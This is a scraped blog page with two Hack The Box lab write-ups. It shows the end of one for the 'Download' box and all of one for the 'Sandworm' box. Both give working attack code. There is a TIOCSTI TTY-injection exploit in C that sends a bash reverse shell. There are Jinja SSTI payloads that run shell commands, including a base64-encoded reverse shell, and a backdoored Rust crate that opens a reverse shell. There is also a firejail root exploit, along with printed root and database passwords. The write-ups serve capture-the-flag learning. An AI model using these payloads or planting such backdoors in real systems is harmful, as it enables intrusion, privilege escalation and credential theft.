/etc/ssl/private drwx--x--- 2 root ssl-cert 4096 Jul 19 15:35 /etc/ssl/private Root TTY exploit #The last logons section from linpeas.sh is intriguing. It show root pty sessions from localhost, which is unusual.\n╔══════════╣ Last logons reboot system boot Tue Aug 1 11:25:10 2023 - Tue Aug 1 11:32:33 2023 (00:07) 0.0.0.0 root pts/1 Tue Aug 1 11:24:41 2023 - down (00:00) 127.0.0.1 wesley pts/0 Tue Aug 1 11:23:56 2023 - Tue Aug 1 11:24:58 2023 (00:01) 10.10.14.46 wesley pts/0 Tue Aug 1 11:23:38 2023 - Tue Aug 1 11:23:52 2023 (00:00) 10.10.14.46 root pts/1 Tue Aug 1 11:23:05 2023 - Tue Aug 1 11:23:40 2023 (00:00) 127.0.0.1 root pts/1 Tue Aug 1 11:21:29 2023 - Tue Aug 1 11:22:04 2023 (00:00) 127.0.0.1 wesley pts/0 Tue Aug 1 11:20:41 2023 - Tue Aug 1 11:23:31 2023 (00:02) 10.10.14.46 reboot system boot Tue Aug 1 11:20:09 2023 - Tue Aug 1 11:25:00 2023 (00:04) 0.0.0.0 ╔══════════╣ Last time logon each user Username Port From Latest root pts/10 127.0.0.1 Fri Aug 11 15:29:15 +0000 2023 wesley pts/13 10.10.14.106 Fri Aug 11 15:33:26 +0000 2023 The w command provides a snapshot of currently logged-in users and the processes they are running. Specifically, it shows the tty session by root is being used to interact with the postgres database.\n(remote) postgres@download:/tmp$ w 15:21:47 up 19 min, 6 users, load average: 0.23, 0.25, 0.27 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT wesley pts/0 10.10.14.132 15:03 14:28 0.08s 0.08s -bash root pts/8 127.0.0.1 15:21 27.00s 0.09s 0.05s /usr/lib/postgresql/12/bin/psql While exploring potential exploits for root tty sessions, I stumbled upon an interesting blog post about hijacking root tty sessions. The PoC for this exploit requires an interactive shell, which is fulfilled by the interactive root login.\nPoC from the blog post\n# su -s /bin/sh - nobody No directory, logging in with HOME=/ $ /tmp/exploit exit echo Payload as $(whoami) $ # echo Payload as $(whoami) Payload as root I modified the PoC code to execute a reverse shell payload.\nexploit.c\n#include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; int main() { int fd = open(\u0026#34;/dev/tty\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return -1; } char *x = \u0026#34;exit\\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.132/9005 0\u0026gt;\u0026amp;1\\n\u0026#34;; while (*x != 0) { int ret = ioctl(fd, TIOCSTI, x); if (ret == -1) { perror(\u0026#34;ioctl()\u0026#34;); } x++; } return 0; } Executing this on the box, returns a version \u0026quot;GLIBC_2.32\u0026quot; not found error, meaning it lacks GCC and necessary shared library objects, it needs to be compiled statically using the --static flag.\n\u0026gt; gcc exploit.c -o exploit.out --static \u0026gt; file exploit.out exploit.out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=c5897a5e18cb4e66dfd9bda71dbb57a78260ae73, for GNU/Linux 3.2.0, not stripped Uploaded the statically compiled binary and made it executable.\n(remote) wesley@download:/home/wesley$ chmod +x /tmp/abraxas/exploit.out (remote) wesley@download:/home/wesley$ ls -la /tmp/abraxas/exploit.out -rwxrwxr-x 1 wesley wesley 751728 Aug 11 18:33 /tmp/abraxas/exploit.out I leveraged the the postgres attributes to execute the static binary in the interactive session.\ndownload=\u0026gt; COPY (SELECT \u0026#39;/tmp/exploit.out\u0026#39;) TO \u0026#39;/var/lib/postgresql/.bash_profile\u0026#39;; COPY 1 When the cron job executes, I get a shell back as root.\n\u0026gt; pc -lp 9005 [23:38:24] Welcome to pwncat 🐈! __main__.py:164 [23:38:53] received connection from 10.10.11.226:35256 bind.py:84 [23:38:54] 10.10.11.226:35256: registered new host w/ db manager.py:957 (local) pwncat$ (remote) root@download:/root# ls -al root.txt total 52 drwx------ 7 root root 4096 Jul 19 16:07 . drwxr-xr-x 19 root root 4096 Jul 19 16:06 .. lrwxrwxrwx 1 root root 9 Apr 21 14:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 5 root root 4096 Jul 19 15:35 .cache drwxr-xr-x 3 root root 4096 Jul 19 15:35 .local -rwxr-xr-x 1 root root 259 Apr 21 17:04 manage-db -rw-r--r-- 1 root root 770 Apr 21 17:05 management.py drwxr-xr-x 5 root root 4096 Jul 19 15:35 .npm -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r----- 1 root root 33 Aug 11 17:32 root.txt drwx------ 2 root root 4096 Jul 19 15:35 .ssh drwxr-xr-x 6 root root 4096 Jul 19 15:35 venv -rw-r--r-- 1 root root 39 Jul 17 11:59 .vimrc (remote) root@download:/root# Pwned!!\nBeyond root #Root\u0026rsquo;s home directory has two files, management.py and manage-db, pspy confirms these two files are being executed recurrently as cron jobs.\n2023/08/11 15:18:13 CMD: UID=0 PID=980 | /root/venv/bin/python3 /root/management.py 2023/08/11 15:21:15 CMD: UID=0 PID=23403 | /bin/bash -i ./manage-db The manage-db bash script is responsible for checking the status of the database and the webserver. Additionally, the download-site service contains the PostgreSQL URI and references the website\u0026rsquo;s root directory, /var/www/app.\n(remote) root@download:/root$ cat manage-db #!/bin/bash -i echo \u0026#34;[*] Checking status of database\u0026#34; SYSTEMD_PAGER= systemctl status postgresql echo \u0026#34;[*] Checking status of webserver\u0026#34; SYSTEMD_PAGER= systemctl status download-site echo \u0026#34;[*] Entering postgres user, use \u0026#39;psql\u0026#39; to enter DB\u0026#34; su -l postgres (remote) root@download:/root$ cat /etc/systemd/system/download-site.service [Unit] Description=Download.HTB Web Application After=network.target [Service] Type=simple User=www-data WorkingDirectory=/var/www/app/ ExecStart=/usr/bin/node app.js Restart=on-failure Environment=NODE_ENV=production Environment=DATABASE_URL=\u0026#34;postgresql://download:CoconutPineappleWatermelon@localhost:5432/download\u0026#34; [Install] WantedBy=multi-user.target (remote) root@download:/var/www# ls -la total 16 drwxr-xr-x 4 root root 4096 Apr 21 16:10 . drwxr-xr-x 13 root root 4096 Jul 19 16:06 .. drwxr-xr-x 8 root root 4096 Apr 21 17:11 app drwxr-xr-x 2 root root 4096 Apr 21 08:40 html (remote) root@download:/var/www# ls -la app/ total 40 drwxr-xr-x 8 root root 4096 Apr 21 17:11 . drwxr-xr-x 4 root root 4096 Apr 21 16:10 .. -rw-r--r-- 1 root root 2168 Apr 21 17:11 app.js drwxr-xr-x 2 root root 4096 Apr 21 15:25 middleware drwxr-xr-x 118 root root 4096 Apr 21 15:27 node_modules -rw-r--r-- 1 root root 890 Apr 21 17:00 package.json drwxr-xr-x 2 root root 4096 Apr 21 16:08 routers drwxr-xr-x 5 root root 4096 Apr 21 15:25 static drwxrwxr-x 2 root www-data 4096 Apr 21 16:03 uploads drwxr-xr-x 2 root root 4096 Apr 21 15:40 views The management.py script performs a cleanup by removing all files in the postgres user\u0026rsquo;s home directory every 60 seconds. Intriguingly, this script is also responsible for the root TTY sessions via SSH. As an additional benefit, it holds root credentials for SSH login.\nroot@download:~# cat management.py import paramiko import time import os while True: print(\u0026#34;Deleting files\u0026#34;) for file_name in os.listdir(\u0026#34;/var/lib/postgresql/\u0026#34;): if file_name != \u0026#34;12\u0026#34;: os.remove(os.path.join(\u0026#34;/var/lib/postgresql/\u0026#34;, file_name)) # This gives people 60 seconds to get their payload within .bashrc time.sleep(60) print(\u0026#34;SSHing\u0026#34;) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(\u0026#34;localhost\u0026#34;, username=\u0026#34;root\u0026#34;, password=\u0026#34;QzN6j#aP#N6!7knrXkN!B$7kq\u0026#34;) chan = ssh.get_transport().open_session() chan.get_pty() chan.invoke_shell() chan.send(b\u0026#39;/bin/bash -i ./manage-db\\n\u0026#39;) time.sleep(5) chan.send(b\u0026#34;psql\\n\u0026#34;) time.sleep(30) if not chan.closed: chan.close() Related Links # NodeJS Express - HackTricks DigitalInterruption/cookie-monster: A utility for automating the testing and re-signing of Express.js cookie secrets. expressjs/cookie-session: Simple cookie-based session middleware Prisma Client API (Reference) - findfirst Filtering and Sorting (Concepts) Prisma Client API (Reference) - contains Prisma Client API (Reference) - startswith 5432,5433 - Pentesting Postgresql - HackTricks su/sudo from root to another user allows TTY hijacking and arbitrary code execution Password bruteforce code in python, ruby and go ","date":"27 November 2023","permalink":"/blog/htb-download/","section":"Blog Posts","summary":"Download is a hard linux box on HTB which hosts an Express application with a file read vulnerability that allowed me to retrieve it\u0026rsquo;s source code. Analyzing the code unveiled issues like broken object-level authentication and a JSON injection vulnerability. Leveraging these weaknesses, I successfully brute forced a user\u0026rsquo;s password, which was reused for SSH login. Next, I found database credentials in a URI of a background process. The database granted me \u003ccode\u003epg_write_server_files\u003c/code\u003e privileges, enabling me to write files on the system as the user postgres. Exploiting a cron job that interactively logs in as postgres, I utilized the write privileges to execute commands in the context of postgres. Further enumeration revealed multiple root TTY sessions, providing an opportunity to hijack them and execute commands as the root user.","title":"HTB Download"},{"content":"","date":null,"permalink":"/tags/htb-hard/","section":"Tags","summary":"","title":"Htb-Hard"},{"content":"","date":null,"permalink":"/tags/json-injection/","section":"Tags","summary":"","title":"Json-Injection"},{"content":"","date":null,"permalink":"/tags/password-bruteforce/","section":"Tags","summary":"","title":"Password-Bruteforce"},{"content":"","date":null,"permalink":"/tags/pg_write_server_files/","section":"Tags","summary":"","title":"Pg_write_server_files"},{"content":"","date":null,"permalink":"/tags/postgres/","section":"Tags","summary":"","title":"Postgres"},{"content":"","date":null,"permalink":"/tags/prisma/","section":"Tags","summary":"","title":"Prisma"},{"content":"","date":null,"permalink":"/tags/root-tty-hijack/","section":"Tags","summary":"","title":"Root-Tty-Hijack"},{"content":"","date":null,"permalink":"/tags/tty/","section":"Tags","summary":"","title":"Tty"},{"content":"","date":null,"permalink":"/tags/cargo/","section":"Tags","summary":"","title":"Cargo"},{"content":"","date":null,"permalink":"/tags/cve-2022-31214/","section":"Tags","summary":"","title":"CVE-2022-31214"},{"content":"","date":null,"permalink":"/tags/firejail/","section":"Tags","summary":"","title":"Firejail"},{"content":"Sandworm HTB #Overview # Sandworm is a medium linux box featuring a website with functionality for PGP operations, one of which is vulnerable to SSTI and leads to a restricted shell. Within the firejail environment, I discovered user credentials allowing me to pivot to a SSH shell. Next, I hijacked a cargo crate for command execution to get an unrestricted shell as the previous user. Finally, I exploit a vulnerable version of firejail to root privileges.\nEnumeration # Open Ports #I discovered three open ports using nmap:\nPort 22 is running OpenSSH. Port 80 hosts a Nginx web server. Port 443 is hosting an HTTPS website. # nmap -p22,80,443 -sV -sC -T4 -Pn -oA ssa.htb ssa.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 10:43 EDT Nmap scan report for ssa.htb (10.129.77.232) Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 |_http-title: Secret Spy Agency | Secret Security Service Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #When I send an HTTP request to port 80, it redirects to the HTTPS site at https://ssa.htb. Adding the new domain to /etc/hosts.\n\u0026gt; http -ph 10.129.77.232 HTTP/1.1 301 Moved Permanently Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Fri, 23 Jun 2023 14:29:17 GMT Location: https://ssa.htb/ Server: nginx/1.18.0 (Ubuntu) port 443 - HTTPS #The response headers from ssa.htb did not reveal any significant information.\n\u0026gt; https --verify no -ph ssa.htb HTTP/1.1 200 OK Connection: keep-alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Date: Fri, 23 Jun 2023 14:44:01 GMT Server: nginx/1.18.0 (Ubuntu) Transfer-Encoding: chunked The ssa.htb website seems to be associated with a SIGINT organization named Secret Spy Agency.\nIndex page According to the website\u0026rsquo;s footer, it is powered by Flask, indicating a Python-based backend.\nFooter Directory Enumeration #While fuzzing the website using ffuf, found a couple interesting endpoints.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ssa.htb/FUZZ -o ffuf_ssa.md -of md -t 100 about [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 228ms] admin [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 222ms] contact [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 245ms] guide [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 259ms] login [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 256ms] logout [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 253ms] pgp [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 244ms] process [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 229ms] view [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 238ms] /about and /contact are generic pages without much info. The contact page does mention that they will accept PGP encrypted emails /login leads a login page with a generic error message /admin and /view redirect to /login /pgp has a public key /process doesn\u0026rsquo;t accept a GET request /guide seems to be a guide for PGP Analyzing /process endpoint\nThe process endpoint accepts POST requests, but likely needs a parameter. After, a bit of enumeration found https://ssa.htb/static/scripts.js which uses this endpoint for PGP processing.\n\u0026gt; https --verify no -ph ssa.htb/process HTTP/1.1 405 METHOD NOT ALLOWED Allow: POST, OPTIONS Connection: keep-alive Content-Length: 153 Content-Type: text/html; charset=utf-8 Date: Fri, 23 Jun 2023 14:48:05 GMT Server: nginx/1.18.0 (Ubuntu) \u0026gt; https --verify no -ph OPTIONS ssa.htb/process HTTP/1.1 200 OK Allow: POST, OPTIONS Connection: keep-alive Content-Length: 0 Content-Type: text/html; charset=utf-8 Date: Fri, 23 Jun 2023 14:48:22 GMT Server: nginx/1.18.0 (Ubuntu) \u0026gt; https --verify no -ph POST ssa.htb/process HTTP/1.1 400 BAD REQUEST Connection: keep-alive Content-Length: 167 Content-Type: text/html; charset=utf-8 Date: Fri, 23 Jun 2023 14:48:30 GMT Server: nginx/1.18.0 (Ubuntu) The webpage at /guide has three functionalities:\nDecrypting a message encrypted with SSA\u0026rsquo;s public key. Encrypting a message with a provided public key for later decryption with the corresponding private key. Verifying the signature of a signed message. SSA has also provided a sample signed message for testing. Given that I have a signed message and the corresponding public key used for encryption, I can now explore and test all three functionalities.\nPGP Guide page Initial Foothold # The verification of a signed message returns a pop-up message containing the result.\nPGP verify result Exploiting SSTI #While exploring the inputs, I observed that while I cannot modify the public key (since it is fixed), manipulating the signed message allows for certain modifications. Specifically, when adding content before the actual message (in the armor header), the signature is still valid but raises an issue regarding an invalid armor header. However, adding data in any other location results in errors about incorrect formatting.\nModify header The contents of the armor header are being reflected as it is in the verification result. This can lead to a lot of vulnerabilities.\nReflected header value I tested for Server-Side Template Injection (SSTI) since this is a Python-based application. I used the {{7*'7'}} payload to check if the templating engine being used is Jinja or Twig (most common python templating engines). The resulting pop-up now displays seven 7\u0026rsquo;s, confirming the presence of SSTI.\nSSTI! To extract configuration variables, I employed the payload {{config.items()}}. This gives two pieces of information:\nSecret Key: 91668c1bc67132e3dcfb5b1a3e0c5c21 SQL Database URI with credentials: atlas:GarlicAndOnionZ42 Unfortunately, the credentials obtained are not reused for either the login page or SSH access.\nSSTI config valriables Attempting to read files on the system using an SSTI payload, I was able to retrieve the contents of the /etc/passwd file, revealing two users with a login shell. Regrettably, the password from config variables doesn\u0026rsquo;t work for the silentobserver user either.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /etc/passwd\u0026#39;).read() }} silentobserver❌1001:1001::/home/silentobserver:/bin/bash atlas❌1000:1000::/home/atlas:/bin/bash Shell as atlas ( w/ firejail) #I was having issues with typical SSTI RCE payloads, likely due to special characters. As a workaround, I used a base64-encoded string, decoded it, and executed the payload.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;bash -c \u0026#34;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi85MDA1IDA+JjEK | base64 -d | bash\u0026#34; \u0026#39;).read() }} This payload resulted in an unconventional shell. The usual methods for shell upgrading failed, followed by a lesspipe error.\n\u0026gt; nc -nlvp 9005 listening on [any] 9005 ... connect to [10.10.14.16] from (UNKNOWN) [10.129.77.232] 42398 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell /usr/local/sbin/lesspipe: 1: dirname: not found atlas@sandworm:/var/www/html/SSA$ id id uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) Privilege Escalation to silentobserver # In an attempt to upgrade the shell, I tried to write my SSH key to the authorized_keys file in the SSH directory. However, this errored out, stating that its a Read-only file system.\natlas@sandworm:~/.ssh$ echo \u0026#39;ssh-rsa AA...\u0026#39; \u0026gt; authorized_keys bash: authorized_keys: Read-only file system Surprisingly, the absence of the sudo binary on the system, coupled with the read-only file system, indicates that I am within a restricted shell.\natlas@sandworm:~$ sudo -l sudo -l Could not find command-not-found database. Run \u0026#39;sudo apt update\u0026#39; to populate it. sudo: command not found Atlas\u0026rsquo; home directory only contains hidden files, including a .cargo and a .config directory.\natlas@sandworm:~$ ls -la ls -la total 44 drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 . drwxr-xr-x 4 nobody nogroup 4096 May 4 2023 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 2023 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 2023 .config drwx------ 4 atlas atlas 4096 Nov 26 20:38 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 2023 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Feb 6 2023 .ssh The presence of a firejail directory within the .config directory further confirms my suspicion of working within a restricted environment.\natlas@sandworm:~/.config$ ls -la ls -la total 12 drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 . drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 .. dr-------- 2 nobody nogroup 40 Jun 23 13:50 firejail drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 httpie Further enumerating the .config directory I discovered authentication credentials for the silentobserver user within an HTTPie session file, quietLiketheWind22.\natlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json cat admin.json ...snip... \u0026#34;auth\u0026#34;: { \u0026#34;password\u0026#34;: \u0026#34;quietLiketheWind22\u0026#34;, \u0026#34;type\u0026#34;: null, \u0026#34;username\u0026#34;: \u0026#34;silentobserver\u0026#34; }, ...snip... With the obtained credentials, I gained access to the /admin endpoint. However, it doesn\u0026rsquo;t reveal anything substantial.\nAdmin page It appears the silentobserver\u0026rsquo;s credentials are reused for SSH access.\n\u0026gt; pc silentobserver:quietLiketheWind22@ssa.htb [16:57:48] Welcome to pwncat 🐈! [16:57:50] ssa.htb:22: registered new host w/ db (local) pwncat$ (remote) silentobserver@sandworm:/home/silentobserver$ id uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver) Privilege Escalation to atlas (w/o firejail) # Unfortunately, the silentobserver user doesn\u0026rsquo;t have any sudo privileges on the box.\n(remote) silentobserver@sandworm:/home/silentobserver$ sudo -l [sudo] password for silentobserver: Sorry, user silentobserver may not run sudo on localhost. Using the database credentials obtained through the SSTI config payload, I logged into the database and dumped the user table, revealing the hash for a new user named Odin. Unfortunately, I couldn\u0026rsquo;t crack the hash.\nmysql\u0026gt; show tables; +---------------+ | Tables_in_SSA | +---------------+ | users | +---------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; +----+----------------+--------------------------------------------------------------------------------------------------------+ | id | username | password | +----+----------------+--------------------------------------------------------------------------------------------------------+ | 1 | Odin | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f | | 2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d | +----+----------------+--------------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) While looking for binaries with the SUID bit set, discovered a couple interesting ones in the /opt/tipnet/target/debug/ directory.\n(remote) silentobserver@sandworm:/home/silentobserver$ find / -perm -u=s -type f 2\u0026gt;/dev/null /opt/tipnet/target/debug/tipnet /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 /usr/local/bin/firejail ...snip... Analyzing tipnet\u0026rsquo;s source code #The tipnet binary is owned by the atlas user and with the SUID bit set is interesting. Although I already have a shell as the user atlas, leveraging this SUID binary might be handy, especially considering the existing shell session is within a firejail environment.\n(remote) silentobserver@sandworm:/home/silentobserver$ ls -la /opt/tipnet/target/debug/tipnet -rwsrwxr-x 2 atlas atlas 59047248 Jun 6 10:00 /opt/tipnet/target/debug/tipnet (remote) silentobserver@sandworm:/home/silentobserver$ /opt/tipnet/target/debug/tipnet ,, MMP\u0026#34;\u0026#34;MM\u0026#34;\u0026#34;YMM db `7MN. `7MF\u0026#39; mm P\u0026#39; MM `7 MMN. M MM MM `7MM `7MMpdMAo. M YMb M .gP\u0026#34;Ya mmMMmm MM MM MM `Wb M `MN. M ,M\u0026#39; Yb MM MM MM MM M8 M `MM.M 8M\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34; MM MM MM MM ,AP M YMM YM. , MM .JMML. .JMML. MMbmmd\u0026#39;.JML. YM `Mbmmd\u0026#39; `Mbmo MM .JMML. Select mode of usage: a) Upstream b) Regular (WIP) c) Emperor (WIP) d) SQUARE (WIP) e) Refresh Indeces Traversing back a few directories, I located the source code for the tipnet binary at /opt/tipnet/src.\n(remote) silentobserver@sandworm:/opt/tipnet$ ls -la total 124 drwxr-xr-x 5 root atlas 4096 Jun 6 11:49 . drwxr-xr-x 4 root root 4096 Nov 26 21:14 .. -rw-rw-r-- 1 atlas atlas 41754 Nov 26 21:14 access.log -rw-r--r-- 1 root atlas 46161 May 4 2023 Cargo.lock -rw-r--r-- 1 root atlas 288 May 4 2023 Cargo.toml drwxr-xr-- 6 root atlas 4096 Jun 6 11:49 .git -rwxr-xr-- 1 root atlas 8 Feb 8 2023 .gitignore drwxr-xr-x 2 root atlas 4096 Jun 6 11:49 src drwxr-xr-x 3 root atlas 4096 Jun 6 11:49 target (remote) silentobserver@sandworm:/opt/tipnet$ ls -la total 16 drwxr-xr-x 2 root atlas 4096 Jun 6 11:49 . drwxr-xr-x 5 root atlas 4096 Jun 6 11:49 .. -rwxr-xr-- 1 root atlas 5795 May 4 2023 main.rs While, I couldn\u0026rsquo;t find anything vulnerable or significant, it does use an external library named logger from crates, the source for which is at /opt/crates/logger/src. Additionally, I cannot edit the rust code either since its owned by root.\nThe atlas user doesn\u0026rsquo;t have any write permissions. Based on the imports from the source code I know that the tipnet binary relies on an external library named logger from crates, whose source code is located at /opt/crates/logger/src.\nextern crate logger; use sha2::{Digest, Sha256}; use chrono::prelude::*; use mysql::*; It\u0026rsquo;s interesting that I have write permissions on the lib.rs file in the /opt/crates/logger/src directory.\nsilentobserver@sandworm:/opt$ ls -la /opt/crates/logger/src total 12 drwxrwxr-x 2 atlas silentobserver 4096 May 4 2023 . drwxr-xr-x 5 atlas silentobserver 4096 May 4 2023 .. -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs Returning to the tipnet source code and analyzing its usage of the logger library, it seems that the logger code is used at two locations:\nWhen the Upstream mode is selected, and the justification value is empty, the log function from the logger library is executed. 76 │ if justification.trim() == \u0026#34;\u0026#34; { 77 │ println!(\u0026#34;[-] No justification provided. TipNet is under 702 authority; queries don\u0026#39;t need warrants, bu │ t need to be justified. This incident has been logged and will be reported.\u0026#34;); 78 │ logger::log(username, keywords.as_str().trim(), \u0026#34;Attempted to query TipNet without justification.\u0026#34;); 79 │ return; 80 │ } When the Refresh Indices mode is selected. 194 │ logger::log(\u0026#34;ROUTINE\u0026#34;, \u0026#34; - \u0026#34;, \u0026#34;Pulling fresh submissions into database.\u0026#34;); Cargo library hijack #In order to exploit this, I modified logger\u0026rsquo;s source code. Specifically, I added a function to spawn a reverse shell whenever the log function is called.\nextern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn gimme_rev_shell() { let s = TcpStream::connect(\u0026#34;10.10.14.16:9005\u0026#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(\u0026#34;/bin/sh\u0026#34;) .arg(\u0026#34;-i\u0026#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } pub fn log(user: \u0026amp;str, query: \u0026amp;str, justification: \u0026amp;str) { gimme_rev_shell(); let now = Local::now(); let timestamp = now.format(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;).to_string(); let log_message = format!(\u0026#34;[{}] - User: {}, Query: {}, Justification: {}\\n\u0026#34;, timestamp, user, query, justification); In order to use this modified code from the tipnet binary I need to build the newly modified logger code.\n(remote) silentobserver@sandworm:/opt/crates/logger/src$ cargo build Compiling autocfg v1.1.0 Compiling libc v0.2.142 Compiling num-traits v0.2.15 Compiling num-integer v0.1.45 Compiling time v0.1.45 Compiling iana-time-zone v0.1.56 Compiling chrono v0.4.24 Compiling logger v0.1.0 (/opt/crates/logger) Finished dev [unoptimized + debuginfo] target(s) in 7.79s Shell as atlas #To trigger the reverse shell function, I simply execute the tipnet binary and choose the Refresh Indices mode. This will call the log function from logger and in turn the reverse shell code.\n(remote) silentobserver@sandworm:/opt/crates/logger/src$ /opt/tipnet/target/debug/tipnet ...snip... ...snip... Select mode of usage: a) Upstream b) Regular (WIP) c) Emperor (WIP) d) SQUARE (WIP) e) Refresh Indeces e [!] Refreshing indeces! [+] Pull complete. I immediately get a shell as the user atlas. Fortunately, this shell doesn\u0026rsquo;t have the constraints of a firejail environment.\n\u0026gt; pc -lp 9005 [17:39:09] Welcome to pwncat 🐈! [17:42:11] received connection from 10.129.77.232:48300 [17:42:12] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash [17:42:13] 10.129.77.232:48300: registered new host w/ db (local) pwncat$ (remote) atlas@sandworm:/opt/tipnet$ id uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer) (remote) atlas@sandworm:/opt/tipnet$ Privilege Escalation to root # The user atlas is a member of the jailer group, which has access to the firejail binary. Interestingly, the firejail binary is owned by the root user and has the SUID bit set.\n(remote) atlas@sandworm:/home/atlas$ find / -group jailer 2\u0026gt;/dev/null /usr/local/bin/firejail (remote) atlas@sandworm:/home/atlas$ ls -la /usr/local/bin/firejail -rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail (remote) atlas@sandworm:/home/atlas$ firejail --version firejail version 0.9.68 ...snip... Firejail Exploit #Looking for potential exploits for the SUID bit on firejail, I came across a security advisory for CVE-2022-31214, relating to firejail version 0.9.68.\nThis CVE report describes a local root exploit vulnerability in Firejail version 0.9.68 and likely various older versions. The vulnerability allows an unprivileged user to fake a legitimate Firejail process and gain root privileges. By creating a custom user and mount namespace, an attacker can manipulate the environment to make /run/firejail writeable and create a symlink that points to a file meeting specific requirements. This allows the attacker to trick Firejail into joining the manipulated environment, ultimately granting them root privileges.\nOpenwall also published a PoC for this exploit. To exploit this, I will need two sessions as atlas, one to execute the exploit, creating a fake firejail process by creating a symklink at /run/firejail/mnt/join and another to join to the said process which runs with euid 0. By default firejail set the NO_NEW_PRIVS flag for sandboxed process, but in this situation the firejail env is faked so it is not set. Additionally, firejail\u0026rsquo;s join trusts the target process, so it also has the NO_NEW_PRIVS flag unset.\n(remote) atlas@sandworm:/dev/shm$ ./firejail_exploit.py You can now run \u0026#39;firejail --join=22960\u0026#39; in another terminal to obtain a shell where \u0026#39;sudo su -\u0026#39; should grant you a root shell. As soon as I join the fake firejail process created by the exploit in a new shell session, it spawns a child process with a new namespace where I can switch to the root user.\n(remote) atlas@sandworm:/opt/tipnet$ firejail --join=22960 changing root to /proc/22960/root Warning: cleaning all supplementary groups Child process initialized in 8.31 ms atlas@sandworm:/opt/tipnet$ sudo su - atlas is not in the sudoers file. This incident will be reported. atlas@sandworm:/opt/tipnet$ su - root@sandworm:~# id uid=0(root) gid=0(root) groups=0(root) root@sandworm:~# cd /root root@sandworm:~# ls -la root.txt -rw-r----- 1 root root 33 Jun 23 13:51 root.txt root@sandworm:~# 